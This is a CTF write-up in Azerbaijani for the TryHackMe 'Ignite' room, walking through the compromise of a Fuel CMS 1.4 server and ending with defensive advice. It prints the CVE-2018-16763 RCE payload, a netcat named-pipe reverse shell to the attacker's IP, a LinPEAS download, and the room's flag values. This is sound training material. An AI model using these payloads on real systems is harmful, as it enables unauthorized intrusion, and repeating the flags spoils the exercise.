# 🔥 TryHackMe — Ignite CTF Writeup (Azərbaycanca)

> **Çətinlik:** Başlanğıc (Beginner)  
> **Vaxt:** ~45 dəqiqə  
> **Hədəf:** user.txt və root.txt flaglarını tapmaq  
> **Texnologiya:** Fuel CMS 1.4, RCE, Privilege Escalation

---

## 📋 Ümumi Məlumat

Bu CTF-də hədəf server **Fuel CMS v1.4** işlədir. Məqsədimiz:
1. Serverdə açıq portları tapmaq (Enumeration)
2. CMS-ə daxil olmaq
3. RCE (Remote Code Execution) açığından istifadə etmək
4. `user.txt` flagını götürmək
5. Root hüquqlarına yüksəlmək (`root.txt`)

---

## Addım 1 — Port Skanlaması (Nmap)

İlk növbədə hədəf maşının hansı portlarının açıq olduğunu öyrənməliyik.

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

**Nmap parametrlərinin izahı:**

| Parametr | Mənası |
|----------|--------|
| `-sC`    | Default scriptləri işlət |
| `-sV`    | Servis versiyasını aşkarlasın |
| `-p-`    | Bütün 65535 portu skan etsin |
| `-T4`    | Sürət rejimi (daha sürətli skan) |

**Nəticə:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18
```

Yalnız **port 80 (HTTP)** açıqdır. Bu bizə işi sadələşdirir — hədəf web serverdədir.

---

## Addım 2 — Web Saytını Analiz Etmək

Brauzerə `http://<TARGET_IP>` yazırıq. Qarşımıza **Fuel CMS v1.4** saytı çıxır.

> **Vacib:** Saytın özündə artıq default login məlumatları yazılıb!  
> Sayfanı aşağı sürüşdürdükdə görəcəksiniz: **admin / admin**

---

## Addım 3 — Qovluq Taraması (Gobuster)

Gizli URL-ləri tapmaq üçün gobuster işlədirik:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan əsas qovluq:**

```
/fuel  → CMS Admin Panel
```

---

## Addım 4 — Admin Panelinə Giriş

Brauzerdə `http://<TARGET_IP>/fuel` ünvanını açırıq. Login formu qarşımıza çıxır.

**Default kimlik məlumatları ilə daxil oluruq:**

```
Username: admin
Password: admin
```

✅ **Giriş uğurlu olur!** Admin dashboarduna keçirik.

> **Niyə bu mümkündür?** Çox şirkət/startup CMS qurarkən default şifrələri dəyişmir.  
> Bu, ən çox rast gəlinən təhlükəsizlik zəifliklərindən biridir.

---

## Addım 5 — RCE Açığı (CVE-2018-16763)

Fuel CMS v1.4-ün kritik bir açığı var: **Remote Code Execution (Uzaqdan Kod İcra)**

- **CVE nömrəsi:** CVE-2018-16763
- **Açıq nədir?** `/fuel/pages/select/` endpointindəki `filter` parametri düzgün sanitasiya edilmir. Bu sayədə PHP kodu birbaşa serverdə icra etmək mümkündür.
- **Auth lazımdır?** XEYİR — Pre-Auth RCE-dir, login olmadan da istifadə etmək olar.

### Exploit-i əldə etmək:

```bash
searchsploit fuel cms 1.4
```

Exploit DB-də **47138** nömrəli exploit var. Onu kopyalayırıq:

```bash
searchsploit -m 47138
```

Ya da Python3 uyğun versiyasını GitHub-dan yükləmək olar:

```bash
git clone https://github.com/p0dalirius/CVE-2018-16763-FuelCMS-1.4.1-RCE.git
cd CVE-2018-16763-FuelCMS-1.4.1-RCE
python3 console.py -t http://<TARGET_IP>
```

### Exploit necə işləyir?

Vulnerable URL nümunəsi:
```
http://<TARGET_IP>/fuel/pages/select/?filter='+pi(print($a='system'))+$a('id')+'
```

Bu URL server-ə `id` komandası göndərir və sistemi məlumatları qaytarır. Exploitin içi məhz bu prinsipdən istifadə edir.

### Exploiti işlətmək:

```bash
python3 console.py -t http://<TARGET_IP>
```

**Nəticə:**
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ pwd
/var/www/html
```

🎉 **Serverdə komanda icra edə bilirik!**

---

## Addım 6 — Reverse Shell Almaq

RCE vasitəsilə stabil shell almaq üçün **reverse shell** göndəririk.

### 6.1 — Netcat dinləyicisi açmaq (öz maşınımızda):

```bash
nc -lnvp 1234
```

### 6.2 — Named pipe reverse shell göndərmək:

Exploit konsolunda bu komandanı icra edirik:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <YOUR_IP> 1234 >/tmp/f
```

**Komandanın izahı:**

| Hissə | Mənası |
|-------|--------|
| `rm /tmp/f` | Köhnə pipe faylını silib |
| `mkfifo /tmp/f` | Named pipe yaradır |
| `cat /tmp/f \| sh -i 2>&1` | Komandaları oxuyub shell-ə verir |
| `nc <YOUR_IP> 1234 >/tmp/f` | Bizim maşına qoşulur |

✅ **Netcat konsolumuzda shell görünür:**

```
connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP] ...
$ whoami
www-data
```

### 6.3 — Shell-i stabilləşdirmək (tövsiyə olunur):

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Sonra `Ctrl+Z` basıb:

```bash
stty raw -echo; fg
```

İndi tam interaktiv shell var.

---

## Addım 7 — User Flagı (user.txt)

```bash
cat /home/www-data/user.txt
```

və ya:

```bash
find / -name "user.txt" 2>/dev/null
```

```
6470e394cbf6dab6a91682cc8585059b
```

🏁 **User flag tapıldı!**

---

## Addım 8 — Privilege Escalation (Root-a qalxmaq)

### 8.1 — LinPEAS ilə sistemin analizi:

Privilege escalation üçün potensial vektorları tapmaq məqsədilə **LinPEAS** işlədirik.

**Öz maşınımızda HTTP server açırıq:**

```bash
python3 -m http.server 9001
```

**Hədəf maşına linpeas yükləyirik:**

```bash
cd /tmp
wget http://<YOUR_IP>:9001/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

> LinPEAS-ı buradan yükləyə bilərsiniz:  
> `https://github.com/peass-ng/PEASS-ng/releases`

### 8.2 — Backup faylında root şifrəsi:

LinPEAS aşkar edir ki, Fuel CMS-in konfiqurasiya faylında **root şifrəsi** saxlanılır.

Konfiqurasiya faylını manual yoxlamaq:

```bash
cat /var/www/html/fuel/application/config/database.php
```

Faylda görünür:

```php
'username' => 'root',
'password' => 'mememe',
```

### 8.3 — Root-a keçid:

```bash
su root
Password: mememe
```

✅ **Root oldunuz!**

---

## Addım 9 — Root Flagı (root.txt)

```bash
cat /root/root.txt
```

```
b9bbcb33e11b80be759c4e844862482d
```

🏆 **Root flag tapıldı! CTF tamamlandı!**

---

## 🔍 İstifadə Olunan Zəifliklər — Xülasə

| Zəiflik | Açıqlama | Rəng |
|---------|----------|------|
| **Default Credentials** | admin:admin — CMS-in default şifrəsi dəyişdirilməyib | 🔴 Kritik |
| **CVE-2018-16763 — RCE** | Fuel CMS 1.4 filter parametrindəki PHP injection açığı | 🔴 Kritik |
| **Şifrənin açıq saxlanması** | Root şifrəsi konfigurasiya faylında plain-text olaraq yazılıb | 🔴 Kritik |

---

## 🛡️ Tövsiyələr (Bu Zəifliklərin Qarşısını Necə Almaq Olar)

1. **Default şifrələri dəyişin** — İlk qurulumdan sonra mütləq admin şifrəsini güclü bir şifrə ilə əvəzləyin.
2. **CMS-i güncəlləyin** — Fuel CMS 1.4 artıq köhnəlmiş versiyadır. Müasir versiyaya yüksəlin.
3. **Şifrələri config faylında saxlamayın** — Environment variable (`$_ENV`) və ya şifrələnmiş vault istifadə edin.
4. **Minimum hüquq prinsipi** — Web server `www-data` kimi işləməlidir, `root` kimi deyil.
5. **Web Application Firewall (WAF)** — SQL/PHP injection cəhdlərini bloklamaq üçün WAF qurun.

---

## 🧰 İstifadə Olunan Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port skanlaması |
| `gobuster` | Qovluq taraması |
| `searchsploit` | Exploit axtarışı |
| `CVE-2018-16763 exploit` | RCE | 
| `netcat (nc)` | Reverse shell listener |
| `LinPEAS` | Privilege escalation analizi |

---

*Bu writeup yalnız təhsil məqsədilə hazırlanmışdır. Hər zaman icazəli sistemlərə qarşı test edin.*
